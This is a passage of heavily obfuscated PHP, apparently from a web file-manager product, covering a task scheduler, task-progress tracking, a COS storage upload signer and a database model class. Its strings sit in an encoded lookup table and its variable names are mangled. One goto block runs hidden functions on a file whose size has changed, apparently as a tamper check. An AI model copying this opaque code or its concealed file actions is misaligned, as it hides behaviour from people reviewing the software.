self::clearUserStatus(); self::valueSet($›¡ñÈË¼[1877], $›¡ñÈË¼[91]); self::log($›¡ñÈË¼[1879] . ACTION . $›¡ñÈË¼[1880]); Hook::bind($›¡ñÈË¼[1881], $›¡ñÈË¼[1882]); $Ä“”ÓŒ‹ = 0; while (!0) { self::cacheClear(); if (self::valueGet($›¡ñÈË¼[852]) != $›¡ñÈË¼[91]) { self::valueSet($›¡ñÈË¼[1877], $›¡ñÈË¼[239]); self::log($›¡ñÈË¼[1883]); die; } $ÁÀí©¡ = time(); if ($ÁÀí©¡ - $Ä“”ÓŒ‹ >= 60) { self::valueSet(array($›¡ñÈË¼[1877] => $›¡ñÈË¼[91], $›¡ñÈË¼[1878] => $ÁÀí©¡)); $Ä“”ÓŒ‹ = $ÁÀí©¡; } if (!file_exists(USER_SYSTEM . $›¡ñÈË¼[1884])) { self::valueSet(array($›¡ñÈË¼[1877] => $›¡ñÈË¼[239], $›¡ñÈË¼[852] => $›¡ñÈË¼[239])); self::log($›¡ñÈË¼[1885]); die; } $ÛõòÓ”§ = file_get_contents(BASIC_PATH . $›¡ñÈË¼[1886]); $§íË”î = KOD_VERSION . $›¡ñÈË¼[10] . KOD_VERSION_BUILD; $•ï˜–ò— = match_text($ÛõòÓ”§, $›¡ñÈË¼[1887]) . $›¡ñÈË¼[10] . match_text($ÛõòÓ”§, $›¡ñÈË¼[1888]); if ($•ï˜–ò— != $§íË”î) { self::restart(); self::log("\163\x74\x6f\160\145\144\56\x5b\166\145\x72\163\151\157\156\x20\165\160\x64\141\164\145\x3b{$versionNow}\x20\75\x3e\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ Ì¨›ÍŸ =& $_SERVER[áäÒ½¯Ç]; http_close(); $GLOBALS[$ Ì¨›ÍŸ[1889]] = 1; $_SERVER[$ Ì¨›ÍŸ[1890]] = $ Ì¨›ÍŸ[1891]; $_COOKIE = array(); $GLOBALS[$ Ì¨›ÍŸ[1892]] = 1; $GLOBALS[$ Ì¨›ÍŸ[1893]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $‘‰ü³° =& $_SERVER[áäÒ½¯Ç]; http_close(); self::valueSet($‘‰ü³°[852], $‘‰ü³°[239]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($‘‰ü³°[1877] => $‘‰ü³°[239], $‘‰ü³°[852] => $‘‰ü³°[91])); self::log($‘‰ü³°[1894]); } public static function taskSwitch() { $–€çó£§ =& $_SERVER[áäÒ½¯Ç]; $ùñ”ú‡Ù = self::valueGet($–€çó£§[852]) == $–€çó£§[91] ? $–€çó£§[239] : $–€çó£§[91]; self::valueSet($–€çó£§[852], $ùñ”ú‡Ù); } public static function shutdownEvent() { $éÅˆ¶× =& $_SERVER[áäÒ½¯Ç]; self::valueSet($éÅˆ¶×[1877], $éÅˆ¶×[239]); self::log($éÅˆ¶×[1895]); } public static function config($æüñ¿á, $èåë·ÎĞ) { self::valueSet($_SERVER[áäÒ½¯Ç][852], $æüñ¿á); } private static function taskRunAll() { $»š…¸ñ£ =& $_SERVER[áäÒ½¯Ç]; $ŞªÄ»ßï = timeFloat(); $Š²®î¯ = Model($»š…¸ñ£[1896])->listData(); $´Ö–åş = count($Š²®î¯); for ($¾şàâ™ğ = 0; $¾şàâ™ğ < $´Ö–åş; $¾şàâ™ğ++) { $Ÿ´ÎÌ¼© = $Š²®î¯[$¾şàâ™ğ]; if (!$Ÿ´ÎÌ¼©[$»š…¸ñ£[492]] || $Ÿ´ÎÌ¼©[$»š…¸ñ£[1897]] != $»š…¸ñ£[91]) { continue; } if (!self::taskTimeCheck($Ÿ´ÎÌ¼©)) { continue; } self::taskRun($Ÿ´ÎÌ¼©); } Hook::trigger($»š…¸ñ£[1898]); self::taskQueueRun($ŞªÄ»ßï); } private static function taskQueueRun($×ŠĞø§Ë) { $ÑãÌ¶¢ = 10; while (!0) { $«†Ò»Ó† = TaskQueue::run(); if ($«†Ò»Ó† === !1) { break; } if (timeFloat() - $×ŠĞø§Ë >= $ÑãÌ¶¢) { break; } } } private static function taskTimeCheck($æÀ…ª„ƒ) { $ŞÌá²À =& $_SERVER[áäÒ½¯Ç]; $æÑ™ÀÍ« = json_decode($æÀ…ª„ƒ[$ŞÌá²À[205]], !0); $ˆ³ò˜ê = intval($æÀ…ª„ƒ[$ŞÌá²À[1878]]); $Ãò¢Ï×Ì = strtotime($ŞÌá²À[1899] . $æÑ™ÀÍ«[$ŞÌá²À[1900]] . $ŞÌá²À[1901]) - strtotime($ŞÌá²À[1902]); $Ó©Ïƒº¥ = time() - strtotime(date($ŞÌá²À[1903]) . $ŞÌá²À[1904]); $éƒµÒ• = $Ó©Ïƒº¥ >= $Ãò¢Ï×Ì && $Ó©Ïƒº¥ <= $Ãò¢Ï×Ì + 3600; switch ($æÑ™ÀÍ«[$ŞÌá²À[33]]) { case $ŞÌá²À[1905]: if (time() - $ˆ³ò˜ê < 3600 * 24 * 30) { return !1; } if ($æÑ™ÀÍ«[$ŞÌá²À[1905]] == date($ŞÌá²À[1906]) && $éƒµÒ•) { return !0; } break; case $ŞÌá²À[1907]: if (time() - $ˆ³ò˜ê < 3600 * 24 * 7) { return !1; } $äôÁ¬¥ª = date($ŞÌá²À[1908]) == 0 ? 7 : date($ŞÌá²À[1908]); if ($æÑ™ÀÍ«[$ŞÌá²À[1907]] == $äôÁ¬¥ª && $éƒµÒ•) { return !0; } break; case $ŞÌá²À[1900]: if (time() - $ˆ³ò˜ê < 3600 * 24) { return !1; } if ($éƒµÒ•) { return !0; } break; case $ŞÌá²À[1909]: if (time() - $ˆ³ò˜ê >= floatval($æÑ™ÀÍ«[$ŞÌá²À[1909]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $‡€Ÿ÷¬Å =& $_SERVER[áäÒ½¯Ç]; static $ò€ğ¼Ò = 0; $‚‹—†—œ = 300; if (!$ò€ğ¼Ò) { $ò€ğ¼Ò = time(); } if (time() - $ò€ğ¼Ò < $‚‹—†—œ) { return; } $ò€ğ¼Ò = time(); $­ïığû¼ = Model($‡€Ÿ÷¬Å[602])->db($‡€Ÿ÷¬Å[12]); if ($­ïığû¼) { $­ïığû¼->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($‡€Ÿ÷¬Å[1910], $‡€Ÿ÷¬Å[1911]); die; } } public static function taskRun($İ®Š‚—) { $¤È©®‰ =& $_SERVER[áäÒ½¯Ç]; self::log($¤È©®‰[1912] . $İ®Š‚—[$¤È©®‰[492]] . $¤È©®‰[1913] . $İ®Š‚—[$¤È©®‰[32]] . $¤È©®‰[1914] . $İ®Š‚—[$¤È©®‰[1513]]); Model($¤È©®‰[1896])->run($İ®Š‚—[$¤È©®‰[492]]); $¹™®ÊÁ = timeFloat(); $‡ƒ¤…¬ = $¤È©®‰[12]; switch ($İ®Š‚—[$¤È©®‰[33]]) { case $¤È©®‰[392]: $¯×»ªÏ¿ = url_request($İ®Š‚—[$¤È©®‰[1513]], $¤È©®‰[1555], !1, !1, !1, !1, 10); if ($¯×»ªÏ¿[$¤È©®‰[852]]) { $‡ƒ¤…¬ = strlen($¯×»ªÏ¿[$¤È©®‰[1339]]); } break; case $¤È©®‰[1915]: $‡ƒ¤…¬ = Hook::apply($İ®Š‚—[$¤È©®‰[1513]]); default: break; } Model($¤È©®‰[1916])->add(array($¤È©®‰[1917] => $¤È©®‰[12], $¤È©®‰[1918] => $¤È©®‰[239], $¤È©®‰[33] => $¤È©®‰[1919] . $İ®Š‚—[$¤È©®‰[492]], $¤È©®‰[1920] => json_encode(array($¤È©®‰[32] => $İ®Š‚—[$¤È©®‰[32]], $¤È©®‰[1921] => timeFloat() - $¹™®ÊÁ, $¤È©®‰[858] => $‡ƒ¤…¬)))); $÷¡¨‘ö¯ = $‡ƒ¤…¬ ? $¤È©®‰[1922] . $‡ƒ¤…¬ : $¤È©®‰[12]; self::log($¤È©®‰[1923] . $İ®Š‚—[$¤È©®‰[492]] . $¤È©®‰[176] . $÷¡¨‘ö¯); return !0; } public static function valueGet($¶Â†Ûóò) { $™ğÒâ‹ =& $_SERVER[áäÒ½¯Ç]; $úˆëÑØ = $™ğÒâ‹[1924]; $Ï³ü‰Ú© = Model($™ğÒâ‹[527])->get($¶Â†Ûóò, $úˆëÑØ); if (is_null($Ï³ü‰Ú©)) { Model($™ğÒâ‹[527])->set($™ğÒâ‹[852], $™ğÒâ‹[91], $úˆëÑØ); Model($™ğÒâ‹[527])->set($™ğÒâ‹[1877], $™ğÒâ‹[239], $úˆëÑØ); $Ï³ü‰Ú© = Model($™ğÒâ‹[527])->get($¶Â†Ûóò, $úˆëÑØ); } return $Ï³ü‰Ú©; } private static function valueSet($¯³Ä¯ıä, $ù„í˜š = false) { $ñ›¨ÑïË =& $_SERVER[áäÒ½¯Ç]; $Ôø¤¹†¼ = $ñ›¨ÑïË[1925]; CacheLock::lock($Ôø¤¹†¼); $õ“òö¶Å = Model($ñ›¨ÑïË[527])->set($¯³Ä¯ıä, $ù„í˜š, $ñ›¨ÑïË[1924]); CacheLock::unlock($Ôø¤¹†¼); return $õ“òö¶Å; } protected static function log($µŞöŸš) { write_log($µŞöŸš, $_SERVER[áäÒ½¯Ç][1911]); } private static function cacheClear() { $Éşìõ÷¥ =& $_SERVER[áäÒ½¯Ç]; Cache::clearMemory(Model($Éşìõ÷¥[527])->cacheKey($Éşìõ÷¥[1924])); Cache::clearMemory(Model($Éşìõ÷¥[527])->cacheKey($Éşìõ÷¥[1926])); Model($Éşìõ÷¥[1896])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\162\x75\156\x6e\x69\x6e\147"; const STATYS_KILL = "\153\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¡£ÂúÆö, $ö¨àï­ = '', $®ê“ô÷× = 0, $ˆóä¨¬ = '') { $†ùúòÓŞ =& $_SERVER[áäÒ½¯Ç]; if (self::get($¡£ÂúÆö)) { return; } $this->task = array($†ùúòÓŞ[492] => $¡£ÂúÆö, $†ùúòÓŞ[1542] => USER_ID, $†ùúòÓŞ[1815] => $ˆóä¨¬, $†ùúòÓŞ[545] => $†ùúòÓŞ[12], $†ùúòÓŞ[33] => $ö¨àï­, $†ùúòÓŞ[1180] => $†ùúòÓŞ[12], $†ùúòÓŞ[1178] => $®ê“ô÷×, $†ùúòÓŞ[1927] => 0, $†ùúòÓŞ[1928] => 0, $†ùúòÓŞ[1929] => 0, $†ùúòÓŞ[1930] => timeFloat(), $†ùúòÓŞ[1931] => 0, $†ùúòÓŞ[1932] => 0, $†ùúòÓŞ[1933] => 0, $†ùúòÓŞ[1934] => 0, $†ùúòÓŞ[852] => $†ùúòÓŞ[1877]); $GLOBALS[$†ùúòÓŞ[1935]] = 1; Hook::bind($†ùúòÓŞ[1881], array($this, $†ùúòÓŞ[1936])); Hook::bind($†ùúòÓŞ[1937], array($this, $†ùúòÓŞ[1938])); $this->startAfter(); Hook::trigger($†ùúòÓŞ[1939], $this->task); $this->task[$†ùúòÓŞ[1932]] = timeFloat(); } public function end($Ù€ò¢³­ = '') { $Ù¸†ïÕ¹ =& $_SERVER[áäÒ½¯Ç]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Ù¸†ïÕ¹[1932]]) { self::valueSet($this->task[$Ù¸†ïÕ¹[492]], !1); } $this->isEnd = !0; if ($Ù€ò¢³­) { $this->task[$Ù¸†ïÕ¹[545]] = $Ù€ò¢³­; } self::log($Ù¸†ïÕ¹[1940] . $this->task[$Ù¸†ïÕ¹[492]] . $Ù¸†ïÕ¹[1941] . sprintf($Ù¸†ïÕ¹[965], timeFloat() - $this->task[$Ù¸†ïÕ¹[1930]]) . $Ù¸†ïÕ¹[1942]); Hook::unbind($Ù¸†ïÕ¹[1881], array($this, $Ù¸†ïÕ¹[1936])); Hook::unbind($Ù¸†ïÕ¹[1937], array($this, $Ù¸†ïÕ¹[1938])); $this->endAfter(); $ÖßìÚÏ´ = $this->task; $this->task = !1; Hook::trigger($Ù¸†ïÕ¹[1943], $ÖßìÚÏ´); } public function update($–•ñ“™ = 0, $™‘¨ßÎÚ = false) { $óçŸ£Ü‹ =& $_SERVER[áäÒ½¯Ç]; $™¬¡Âíå =& $this->task; if (!$™¬¡Âíå) { return; } $™¬¡Âíå[$óçŸ£Ü‹[1927]] += $–•ñ“™; $™¬¡Âíå[$óçŸ£Ü‹[1931]] = timeFloat(); if ($™¬¡Âíå[$óçŸ£Ü‹[1178]]) { if ($™¬¡Âíå[$óçŸ£Ü‹[1178]] < $™¬¡Âíå[$óçŸ£Ü‹[1927]]) { $™¬¡Âíå[$óçŸ£Ü‹[1178]] = $™¬¡Âíå[$óçŸ£Ü‹[1927]]; } $¬”Ú¨½ı = timeFloat() - $™¬¡Âíå[$óçŸ£Ü‹[1930]] - $™¬¡Âíå[$óçŸ£Ü‹[1933]]; if ($¬”Ú¨½ı <= 0) { $¬”Ú¨½ı = 0.001; } $™¬¡Âíå[$óçŸ£Ü‹[1928]] = $™¬¡Âíå[$óçŸ£Ü‹[1927]] / $™¬¡Âíå[$óçŸ£Ü‹[1178]]; $™¬¡Âíå[$óçŸ£Ü‹[1929]] = $™¬¡Âíå[$óçŸ£Ü‹[1927]] / $¬”Ú¨½ı; if ($™¬¡Âíå[$óçŸ£Ü‹[1928]] > 0) { $™¬¡Âíå[$óçŸ£Ü‹[1934]] = $¬”Ú¨½ı * (1 - $™¬¡Âíå[$óçŸ£Ü‹[1928]]) / $™¬¡Âíå[$óçŸ£Ü‹[1928]]; } $™¬¡Âíå[$óçŸ£Ü‹[1934]] = $™¬¡Âíå[$óçŸ£Ü‹[1934]] <= 0 ? 0 : $™¬¡Âíå[$óçŸ£Ü‹[1934]]; } $this->updateAfter(); $ƒºáéã¢ = 0.2; if (timeFloat() - $™¬¡Âíå[$óçŸ£Ü‹[1932]] < $ƒºáéã¢ && !$™‘¨ßÎÚ) { return; } $Ò×¾ìÓö = self::get($™¬¡Âíå[$óçŸ£Ü‹[492]]); $İË‡ô¬¸ = $Ò×¾ìÓö[$óçŸ£Ü‹[852]]; if ($İË‡ô¬¸ == self::STATYS_KILL) { $Ş¹¼¦¨† = array($óçŸ£Ü‹[1944] => LNG($óçŸ£Ü‹[1945]), $óçŸ£Ü‹[1349] => !1); Cache::set($óçŸ£Ü‹[1946] . $this->task[$óçŸ£Ü‹[492]], $Ş¹¼¦¨†, 30); $this->onKill(); $this->end(); die; } else { if ($İË‡ô¬¸ == self::STATYS_STOP) { $ç‚Ì®¿‘ = 2; $Ò×¾ìÓö[$óçŸ£Ü‹[1933]] += $ç‚Ì®¿‘; self::valueSet($™¬¡Âíå[$óçŸ£Ü‹[492]], $Ò×¾ìÓö); sleep($ç‚Ì®¿‘); $this->update(); return; } } $™¬¡Âíå[$óçŸ£Ü‹[852]] = $İË‡ô¬¸ ? $İË‡ô¬¸ : $™¬¡Âíå[$óçŸ£Ü‹[852]]; $™¬¡Âíå[$óçŸ£Ü‹[1933]] = $Ò×¾ìÓö[$óçŸ£Ü‹[1933]] ? $Ò×¾ìÓö[$óçŸ£Ü‹[1933]] : 0; $™¬¡Âíå[$óçŸ£Ü‹[1932]] = timeFloat(); Hook::trigger($óçŸ£Ü‹[1947], $™¬¡Âíå); self::valueSet($™¬¡Âíå[$óçŸ£Ü‹[492]], $™¬¡Âíå); } public function onKillSet($ƒ¥Ó–ıÙ, $ß«Êñ¦ = array()) { $this->onKillCall = array($ƒ¥Ó–ıÙ, $ß«Êñ¦); } public function onKill() { $”«Ù¨À° =& $_SERVER[áäÒ½¯Ç]; self::log($”«Ù¨À°[1940] . $this->task[$”«Ù¨À°[492]] . $”«Ù¨À°[1948]); Hook::trigger($”«Ù¨À°[1949], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($å†ôƒıò) { $ÅÙáÄÍÜ =& $_SERVER[áäÒ½¯Ç]; Cache::set($ÅÙáÄÍÜ[1946] . $this->task[$ÅÙáÄÍÜ[492]], $å†ôƒıò, 60); if (!is_array($å†ôƒıò) || !$å†ôƒıò[$ÅÙáÄÍÜ[1349]]) { self::log($ÅÙáÄÍÜ[1950] . json_encode($å†ôƒıò)); } return $å†ôƒıò; } public static function get($Îí¢ƒ¦´) { $şªÉı®œ =& $_SERVER[áäÒ½¯Ç]; $Ì­Íù¾ü = self::valueGet($Îí¢ƒ¦´); if (is_array($Ì­Íù¾ü) && $Ì­Íù¾ü[$şªÉı®œ[1951]]) { $µİä¼‚ = ActionApply($Ì­Íù¾ü[$şªÉı®œ[1951]], array($Ì­Íù¾ü)); $Ì­Íù¾ü = is_array($µİä¼‚) ? $µİä¼‚ : $Ì­Íù¾ü; } return $Ì­Íù¾ü; } public static function listData() { $õÏ²»Ø = self::valueGet(); return array_sort_by($õÏ²»Ø, $_SERVER[áäÒ½¯Ç][1930], !0); } public static function kill($ºÊìªÌâ) { return self::changeStatus($ºÊìªÌâ, self::STATYS_KILL); } public static function stop($èêŞ¶“Ñ) { return self::changeStatus($èêŞ¶“Ñ, self::STATYS_STOP); } public static function restart($¼ıÈ–¨Ş) { return self::changeStatus($¼ıÈ–¨Ş, self::STATYS_RUNNING); } public static function killAll() { $÷Ğ«ÆÍ‹ =& $_SERVER[áäÒ½¯Ç]; $Á•üÚˆ• = self::listData(); foreach ($Á•üÚˆ• as $Æ’µ—ÇÔ) { self::kill($Æ’µ—ÇÔ[$÷Ğ«ÆÍ‹[492]]); } sleep(2); foreach ($Á•üÚˆ• as $Æ’µ—ÇÔ) { self::valueSet($Æ’µ—ÇÔ[$÷Ğ«ÆÍ‹[492]], !1); } } private static function changeStatus($­­ÏêñÆ, $–¼îØ™á) { $’š½İ’² =& $_SERVER[áäÒ½¯Ç]; $çëîÑÀ = self::valueGet($­­ÏêñÆ); if (!$çëîÑÀ) { return !1; } $çëîÑÀ[$’š½İ’²[852]] = $–¼îØ™á; self::valueSet($­­ÏêñÆ, $çëîÑÀ); self::log($’š½İ’²[1952] . $çëîÑÀ[$’š½İ’²[492]] . $’š½İ’²[1953] . $–¼îØ™á); return !0; } public static function valueGet($Ÿ˜ó”Ÿ = false) { $®Âİ®•Ì =& $_SERVER[áäÒ½¯Ç]; if ($Ÿ˜ó”Ÿ) { $ÍÅíæĞÔ = Model($®Âİ®•Ì[539])->where(array($®Âİ®•Ì[95] => $Ÿ˜ó”Ÿ, $®Âİ®•Ì[33] => $®Âİ®•Ì[1187]))->find(); return $ÍÅíæĞÔ ? json_decode($ÍÅíæĞÔ[$®Âİ®•Ì[460]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($áí°…® = false) { $Ç†£Ğ×Õ =& $_SERVER[áäÒ½¯Ç]; $ªÆËÏñ¦ = array($Ç†£Ğ×Õ[33] => $Ç†£Ğ×Õ[1187]); if ($áí°…®) { $ªÆËÏñ¦[$Ç†£Ğ×Õ[1542]] = $áí°…®; } $ËâØ€›ç = Model($Ç†£Ğ×Õ[539])->where($ªÆËÏñ¦)->select(); $ËâØ€›ç = $ËâØ€›ç ? $ËâØ€›ç : array(); foreach ($ËâØ€›ç as $ ÎÆÄ¯™ => $å…¥ğèš) { $ËâØ€›ç[$ ÎÆÄ¯™] = json_decode($å…¥ğèš[$Ç†£Ğ×Õ[460]], !0); } return $ËâØ€›ç; } public static function valueSet($€«Ş…Îà, $®ú¹ôò€) { $ÄĞ•Â˜ü =& $_SERVER[áäÒ½¯Ç]; if (!$®ú¹ôò€) { return Model($ÄĞ•Â˜ü[539])->where(array($ÄĞ•Â˜ü[95] => $€«Ş…Îà, $ÄĞ•Â˜ü[33] => $ÄĞ•Â˜ü[1187]))->delete(); } $—ö® é‹ = json_encode($®ú¹ôò€); if (!$—ö® é‹) { ob_start(); var_dump($®ú¹ôò€); $‡˜•±Áî = ob_get_clean(); self::log($ÄĞ•Â˜ü[1954] . json_encode_force($‡˜•±Áî)); } if (!$€«Ş…Îà || !$®ú¹ôò€[$ÄĞ•Â˜ü[492]]) { return !1; } $’ë»‹ÒÜ = array($ÄĞ•Â˜ü[33] => $ÄĞ•Â˜ü[1187], $ÄĞ•Â˜ü[1542] => USER_ID, $ÄĞ•Â˜ü[95] => $€«Ş…Îà, $ÄĞ•Â˜ü[460] => $—ö® é‹); $¡®”ÀœŒ = $ÄĞ•Â˜ü[1955]; CacheLock::lock($¡®”ÀœŒ); Model($ÄĞ•Â˜ü[539])->add($’ë»‹ÒÜ, array(), !0); CacheLock::unlock($¡®”ÀœŒ); } public static function log($Îø…ç³) { if (!GLOBAL_DEBUG) { return; } write_log($Îø…ç³, $_SERVER[áäÒ½¯Ç][1956]); } } goto EŒßÚùÇÅ’; F›Æ‰‹±ˆÂ: $_size = $_SERVER[áäÒ½¯Ç][216]; if ($_SERVER[$_SERVER[áäÒ½¯Ç][217]] != $_size($_file)) { $_getc = $_SERVER[áäÒ½¯Ç][218]; $_getfile = $_SERVER[$_SERVER[áäÒ½¯Ç][219]] . $_SERVER[áäÒ½¯Ç][220]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[áäÒ½¯Ç][221], $_getfilec); if (count($_getarrs) < $_SERVER[áäÒ½¯Ç][222]) { $exit = $_SERVER[áäÒ½¯Ç][223]; $exit(); } $_act = $_SERVER[áäÒ½¯Ç][224]; $_act($_file); } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($àÅëÅ„Ş) { parent::__construct($àÅëÅ„Ş); $this->setSignVersion($_SERVER[áäÒ½¯Ç][258]); } public function uploadFormData($›õããö, $¡Ú¸±Ñò = 3600) { $ÃŠíêø˜ =& $_SERVER[áäÒ½¯Ç]; $î‰ö¨Áš = $ÃŠíêø˜[240]; $Ø¸–ê½· = $ÃŠíêø˜[1473]; $óÈï÷½¤ = $ÃŠíêø˜[272]; $ÆúİËÑƒ = gmdate($ÃŠíêø˜[1474], time() + $¡Ú¸±Ñò); $†û„ıàŠ = (string) time() . $ÃŠíêø˜[74] . (string) (time() + $¡Ú¸±Ñò); $œÔÓçŸÏ = array($ÃŠíêø˜[273] => $ÆúİËÑƒ, $ÃŠíêø˜[276] => array(array($ÃŠíêø˜[316] => $î‰ö¨Áš), array($ÃŠíêø˜[277] => $this->bucket), array($ÃŠíêø˜[278], $ÃŠíêø˜[279], $ÃŠíêø˜[12]), array($ÃŠíêø˜[281] => $óÈï÷½¤), array($ÃŠíêø˜[1475] => $Ø¸–ê½·), array($ÃŠíêø˜[1476] => $this->accessKey), array($ÃŠíêø˜[1477] => $†û„ıàŠ))); $œÔÓçŸÏ = json_encode($œÔÓçŸÏ); $Š¸ª¬„÷ = hash_hmac($ÃŠíêø˜[1473], $†û„ıàŠ, $this->secret); $ßÔŸâÙ = sha1($œÔÓçŸÏ); $ŸîƒĞú§ = hash_hmac($ÃŠíêø˜[1473], $ßÔŸâÙ, $Š¸ª¬„÷); $Î´­²Š = array($ÃŠíêø˜[316] => $î‰ö¨Áš, $ÃŠíêø˜[281] => $óÈï÷½¤, $ÃŠíêø˜[288] => base64_encode($œÔÓçŸÏ), $ÃŠíêø˜[1475] => $Ø¸–ê½·, $ÃŠíêø˜[1476] => $this->accessKey, $ÃŠíêø˜[1478] => $†û„ıàŠ, $ÃŠíêø˜[1479] => $ŸîƒĞú§, $ÃŠíêø˜[207] => $this->getHost()); return $Î´­²Š; } public function fileOutImage($ö¥½¼…Ó, $ç¸˜‹¦ = 250) { $‚åŞ¡ÂÛ =& $_SERVER[áäÒ½¯Ç]; if ($this->size($ö¥½¼…Ó) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ö¥½¼…Ó, $ç¸˜‹¦); } $øİØÌÎæ = $this->link($ö¥½¼…Ó); $øİØÌÎæ .= $‚åŞ¡ÂÛ[1480] . $ç¸˜‹¦ . $‚åŞ¡ÂÛ[1481]; $this->fileOutLink($øİØÌÎæ); } } goto fš–Ê›ùš‹; Eæ‚ô–¹×: define($_SERVER[áäÒ½¯Ç][330], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\x65", "\157\162\x64\x65\162", "\141\154\151\x61\163", "\x68\x61\x76\x69\156\147", "\147\162\x6f\x75\x70", "\x6c\157\x63\153", "\144\x69\x73\x74\151\x6e\x63\x74", "\x61\x75\x74\157", "\146\151\x6c\x74\x65\x72", "\x76\141\154\x69\144\141\x74\x65", "\162\145\163\165\x6c\x74", "\142\x69\x6e\144", "\x74\x6f\x6b\x65\x6e"); public function __construct($¶Ò„œ¯È = '', $·‚¬ë´ = '', $àì¸¹İ‡ = '') { $•âÇÄÄİ =& $_SERVER[áäÒ½¯Ç]; $this->_initialize(); if (!empty($¶Ò„œ¯È)) { if (strpos($¶Ò„œ¯È, $•âÇÄÄİ[10])) { list($this->dbName, $this->name) = explode($•âÇÄÄİ[10], $¶Ò„œ¯È); } else { $this->name = $¶Ò„œ¯È; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($·‚¬ë´)) { $this->tablePrefix = $•âÇÄÄİ[12]; } elseif ($•âÇÄÄİ[12] != $·‚¬ë´) { $this->tablePrefix = $·‚¬ë´; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($•âÇÄÄİ[331]); } $this->db(0, empty($this->connection) ? $àì¸¹İ‡ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Ï“”õó¥ =& $_SERVER[áäÒ½¯Ç]; if (empty($this->fields)) { if (think_config($Ï“”õó¥[332])) { $ù•“ßŞõ = $this->dbName ? $this->dbName : think_config($Ï“”õó¥[333]); $˜àßø©¾ = think_var_cache($Ï“”õó¥[334] . strtolower(get_path_this($ù•“ßŞõ) . $Ï“”õó¥[10] . $this->name)); if ($˜àßø©¾) { $ê´²Ô¯Ò = think_config($Ï“”õó¥[335]); if (empty($ê´²Ô¯Ò) || $˜àßø©¾[$Ï“”õó¥[336]] == $ê´²Ô¯Ò) { $this->fields = $˜àßø©¾; return; } } } $this->flush(); } } public function flush() { $ç‡¶úœó =& $_SERVER[áäÒ½¯Ç]; $this->db->setModel($this->name); $š«ÏØü = $this->db->getFields($this->getTableName()); if (!$š«ÏØü) { return !1; } $this->fields = array_keys($š«ÏØü); $this->fields[$ç‡¶úœó[337]] = !1; foreach ($š«ÏØü as $õà§­Üã => $Èğ¦»ƒ) { $âšúÏéÖ[$õà§­Üã] = $Èğ¦»ƒ[$ç‡¶úœó[33]]; if ($Èğ¦»ƒ[$ç‡¶úœó[39]]) { $this->fields[$ç‡¶úœó[338]] = $õà§­Üã; if ($Èğ¦»ƒ[$ç‡¶úœó[42]]) { $this->fields[$ç‡¶úœó[337]] = !0; } } } $this->fields[$ç‡¶úœó[339]] = $âšúÏéÖ; if (think_config($ç‡¶úœó[335])) { $this->fields[$ç‡¶úœó[336]] = think_config($ç‡¶úœó[335]); } if (think_config($ç‡¶úœó[332])) { $íìåøç† = $this->dbName ? $this->dbName : think_config($ç‡¶úœó[333]); think_var_cache($ç‡¶úœó[334] . strtolower(get_path_this($íìåøç†) . $ç‡¶úœó[10] . $this->name), $this->fields); } } public function switchModel($ñ¦æ‘“Ş, $½‹÷§ê¨ = array()) { $¢®Ø‘‚á =& $_SERVER[áäÒ½¯Ç]; $Í¹§¡Òµ = ucwords(strtolower($ñ¦æ‘“Ş)) . $¢®Ø‘‚á[340]; if (!class_exists($Í¹§¡Òµ)) { think_exception($Í¹§¡Òµ . think_lang($¢®Ø‘‚á[341])); } $this->_extModel = new $Í¹§¡Òµ($this->name); if (!empty($½‹÷§ê¨)) { foreach ($½‹÷§ê¨ as $òãç³©¼) { $this->_extModel->setProperty($òãç³©¼, $this->{$òãç³©¼}); } } return $this->_extModel; } public function __set($î”ø§», $ÏÌ¿‚°») { $this->data[$î”ø§»] = $ÏÌ¿‚°»; } public function __get($é©÷ÆÇ‘) { return isset($this->data[$é©÷ÆÇ‘]) ? $this->data[$é©÷ÆÇ‘] : null; } public function __isset($Í‘øÓ) { return isset($this->data[$Í‘øÓ]); } public function __unset($ÙÕ´Ÿóµ) { unset($this->data[$ÙÕ´Ÿóµ]); } public function __call($ƒ•Šœ•¼, $¬ù€ø¾¥) { $÷ÀÍ¥»´ =& $_SERVER[áäÒ½¯Ç]; if (in_array(strtolower($ƒ•Šœ•¼), $this->methods, !0)) { $this->options[strtolower($ƒ•Šœ•¼)] = $¬ù€ø¾¥[0]; return $this; } elseif (in_array(strtolower($ƒ•Šœ•¼), array($÷ÀÍ¥»´[342], $÷ÀÍ¥»´[343], $÷ÀÍ¥»´[344], $÷ÀÍ¥»´[345], $÷ÀÍ¥»´[346]), !0)) { $©§§Íİ = isset($¬ù€ø¾¥[0]) ? $¬ù€ø¾¥[0] : $÷ÀÍ¥»´[231]; $©§§Íİ = $this->db->parseKey($©§§Íİ); return $this->getField(strtoupper($ƒ•Šœ•¼) . $÷ÀÍ¥»´[347] . $©§§Íİ . $÷ÀÍ¥»´[348] . $ƒ•Šœ•¼, $÷ÀÍ¥»´[342]); } elseif (strtolower(substr($ƒ•Šœ•¼, 0, 5)) == 